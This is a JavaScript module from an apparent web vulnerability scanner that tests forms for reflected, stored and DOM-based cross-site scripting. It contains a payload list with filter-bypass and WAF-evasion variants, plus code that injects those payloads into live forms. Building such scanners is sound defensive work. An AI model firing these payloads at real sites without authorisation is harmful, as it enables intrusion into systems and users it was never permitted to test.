const axios = require('axios');
const { URL } = require('url');
const crypto = require('crypto');
const { sendRequest: sharedSendRequest, fetchPage: sharedFetchPage } = require('./httpClient');
const { sleep, pushResult: sharedPushResult } = require('./utils');

// 1. XSS Payloads (Expanded with DVWA medium/high bypass techniques)
const XSS_PAYLOADS = [
    // Basic payloads (DVWA Low)
    "<script>alert('PhoenixXSS')</script>",
    "'\"><img src=x onerror=alert('PhoenixXSS')>",
    "<svg/onload=alert('PhoenixXSS')>",
    // DVWA Medium bypass (strips <script> tag only)
    "<img src=x onerror=alert('PhoenixXSS')>",
    "<svg onload=alert('PhoenixXSS')>",
    "<body onload=alert('PhoenixXSS')>",
    "<input onfocus=alert('PhoenixXSS') autofocus>",
    "<details open ontoggle=alert('PhoenixXSS')>",
    "<marquee onstart=alert('PhoenixXSS')>",
    // DVWA High bypass (regex strips <script with any case/spacing, but not other tags)
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=\"javascript:alert('PhoenixXSS')\">",
    // WAF bypass — backtick syntax
    "<img src=x onerror=alert`1`>",
    // Slash & encoding variations
    "<img/src=x onerror=confirm('PhoenixXSS')>",
    "<svg onload=alert(String.fromCharCode(80,104,111,101,110,105,120))>",
    // Event handler variations
    "<a href=javascript:alert('PhoenixXSS')>click</a>",
    "javascript:alert('PhoenixXSS')",
    // Double encoding
    "%3Csvg%20onload%3Dalert(1)%3E",
    // Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('PhoenixXSS') )//",
];

// XSS markers for partial reflection detection
const XSS_REFLECTION_MARKERS = [
    { tag: '<img', attr: 'onerror=' },
    { tag: '<svg', attr: 'onload=' },
    { tag: '<body', attr: 'onload=' },
    { tag: '<input', attr: 'onfocus=' },
    { tag: '<details', attr: 'ontoggle=' },
    { tag: '<iframe', attr: 'src=' },
    { tag: '<marquee', attr: 'onstart=' },
];

// DOM-based XSS dangerous sinks
const DOM_XSS_SINKS = [
    /document\.write\s*\(/i,
    /\.innerHTML\s*=/i,
    /\.outerHTML\s*=/i,
    /eval\s*\(/i,
    /setTimeout\s*\(\s*['"]/i,
    /setInterval\s*\(\s*['"]/i,
    /document\.location\s*=/i,
    /window\.location\s*=/i,
    /window\.location\.href\s*=/i,
    /\.insertAdjacentHTML\s*\(/i,
];

// DOM-based XSS sources (user-controlled input)
const DOM_XSS_SOURCES = [
    /document\.URL/i,
    /document\.referrer/i,
    /location\.hash/i,
    /location\.search/i,
    /location\.href/i,
    /window\.name/i,
    /document\.cookie/i,
];

// 2. Main Reflected XSS Scanning Function
async function scanForXSS(url, method = 'GET', data = {}, locationDescription, contentType = 'form', httpClient) {
    const vulnerabilities = [];
    let scoreDeduction = 0;
    const client = httpClient || axios;

    // --- Baseline fetch ---
    let baselineBody = '';
    try {
        const baseResp = await sendRequest(url, method, data, contentType, client);
        baselineBody = baseResp.body;
    } catch (e) { }

    // --- DOM-based XSS Check (analyze page scripts) ---
    try {
        const pageResponse = await sendRequest(url, 'GET', {}, 'form', client);
        const pageBody = pageResponse.body;

        const scriptRegex = /<script[^>]*>([\s\S]*?)<\/script>/gi;
        let match;
        while ((match = scriptRegex.exec(pageBody)) !== null) {
            const scriptContent = match[1];
            const hasSink = DOM_XSS_SINKS.some(sink => sink.test(scriptContent));
            const hasSource = DOM_XSS_SOURCES.some(source => source.test(scriptContent));

            if (hasSink && hasSource) {
                vulnerabilities.push({
                    type: 'Cross-Site Scripting (XSS)',
                    name: 'Potential DOM-Based XSS',
                    severity: 'Medium',
                    location: locationDescription,
                    description: `Page JavaScript contains DOM XSS pattern: user-controlled source flows into dangerous sink.`
                });
                scoreDeduction += 10;
                break;
            }
        }
    } catch (e) { /* continue to reflected checks */ }

    // --- Reflected XSS Check ---
    for (const payload of XSS_PAYLOADS) {
        let attackData = { ...data };
        for (let key in attackData) {
            if (attackData[key] === 'Submit' || attackData[key] === 'submit') continue;
            attackData[key] = payload;
        }

        try {
            const response = await sendRequest(url, method, attackData, contentType, client);
            const body = response.body;

            // A. Exact payload reflection
            if (body.includes(payload)) {
                vulnerabilities.push({
                    type: 'Cross-Site Scripting (XSS)',
                    name: `Reflected XSS [${contentType.toUpperCase()}]`,
                    severity: 'Medium',
                    location: locationDescription,
                    description: `Input reflected immediately via ${contentType}. Payload: ${payload}`
                });
                scoreDeduction += 15;
                return { vulnerabilities, scoreDeduction };
            }

            // B. Partial reflection detection (for medium/high filters that strip parts)
            for (const marker of XSS_REFLECTION_MARKERS) {
                if (payload.toLowerCase().includes(marker.tag)) {
                    const hasTag = body.toLowerCase().includes(marker.tag);
                    const hasAttr = body.toLowerCase().includes(marker.attr);
                    const baseHasTag = baselineBody.toLowerCase().includes(marker.tag + ' src=x') ||
                                       baselineBody.toLowerCase().includes(marker.tag + '/');
                    if (hasTag && hasAttr && !baseHasTag) {
                        vulnerabilities.push({
                            type: 'Cross-Site Scripting (XSS)',
                            name: `Reflected XSS (Partial) [${contentType.toUpperCase()}]`,
                            severity: 'Medium',
                            location: locationDescription,
                            description: `XSS tag "${marker.tag}" with event handler "${marker.attr}" reflected in response. Payload: ${payload}`
                        });
                        scoreDeduction += 15;
                        return { vulnerabilities, scoreDeduction };
                    }
                }
            }
        } catch (err) {
            // continue
        }
    }

    return { vulnerabilities, scoreDeduction };
}

// 3. Stored XSS Scanning Function
async function scanForStoredXSS(form, verifyUrls, report, httpClient) {
    const vulnerabilities = [];
    let scoreDeduction = 0;
    const client = httpClient || axios;

    const uniqueId = crypto.randomBytes(4).toString('hex');
    const STORED_PAYLOADS = [
        `<script>alert('PhxStored${uniqueId}')</script>`,
        `'"><img src=x onerror=alert('PhxStored${uniqueId}')>`,
        `<svg/onload=alert('PhxStored${uniqueId}')>`,
        `<img src=x onerror=alert('PhxStored${uniqueId}')>`,
    ];

    const baselineResults = await Promise.all(
        verifyUrls.map(async vUrl => {
            try { return { url: vUrl, body: await fetchPage(vUrl, client) }; }
            catch (e) { return { url: vUrl, body: '' }; }
        })
    );
    const baselines = {};
    baselineResults.forEach(r => baselines[r.url] = r.body);

    const inputs = {};
    for (const [name] of Object.entries(form.inputs)) {
        inputs[name] = 'placeholder';
    }
    if (Object.keys(inputs).length === 0) return { vulnerabilities, scoreDeduction };

    for (const paramName of Object.keys(inputs)) {
        const inputInfo = form.inputs[paramName];
        if (inputInfo && inputInfo.type === 'submit') continue;

        for (const payload of STORED_PAYLOADS) {
            const attackData = {};
            for (const key of Object.keys(inputs)) {
                const info = form.inputs[key];
                if (key === paramName) {
                    attackData[key] = payload;
                } else if (info && info.type === 'submit') {
                    attackData[key] = info.value || 'Submit';
                } else {
                    attackData[key] = 'safe_test_value';
                }
            }

            try {
                await sendRequest(form.action, form.method, attackData, 'form', client);
                await sleep(100);

                const verifyResults = await Promise.all(
                    verifyUrls.map(async vUrl => {
                        try { return { url: vUrl, body: await fetchPage(vUrl, client) }; }
                        catch (e) { return { url: vUrl, body: '' }; }
                    })
                );

                for (const { url: vUrl, body: pageBody } of verifyResults) {
                    if (pageBody.includes(payload)) {
                        vulnerabilities.push({
                            type: 'Cross-Site Scripting (XSS)',
                            name: 'Stored XSS Detected',
                            severity: 'High',
                            location: `Parameter: "${paramName}" in form at ${form.action} → displayed on ${vUrl}`,
                            description: `Payload injected into "${paramName}" was stored and rendered on ${vUrl}. Payload: ${payload}`
                        });
                        scoreDeduction += 30;
                        if (report) pushResult(report, { vulnerabilities, scoreDeduction }, 'Stored XSS', true);
                        return { vulnerabilities, scoreDeduction };
                    }

                    const marker = `PhxStored${uniqueId}`;
                    if (pageBody.includes(marker) && pageBody !== baselines[vUrl]) {
                        vulnerabilities.push({
                            type: 'Cross-Site Scripting (XSS)',
                            name: 'Stored XSS Detected (Partial)',
                            severity: 'High',
                            location: `Parameter: "${paramName}" in form at ${form.action} → displayed on ${vUrl}`,
                            description: `Unique marker found stored on ${vUrl} after injecting "${paramName}".`
                        });
                        scoreDeduction += 25;
                        if (report) pushResult(report, { vulnerabilities, scoreDeduction }, 'Stored XSS (Partial)', true);
                        return { vulnerabilities, scoreDeduction };
                    }
                }
            } catch (err) { }
        }
    }
    return { vulnerabilities, scoreDeduction };
}


// 4. Request Helper — Delegates to shared module
async function sendRequest(url, method, attackData, contentType, client) {
    const http = client || axios;
    return sharedSendRequest(http, { url, method, data: attackData, contentType });
}


// 5. Utility Helpers — Delegates to shared modules
async function fetchPage(url, client) {
    const http = client || axios;
    return sharedFetchPage(http, url);
}

const pushResult = sharedPushResult;


module.exports = { scanForXSS, scanForStoredXSS };
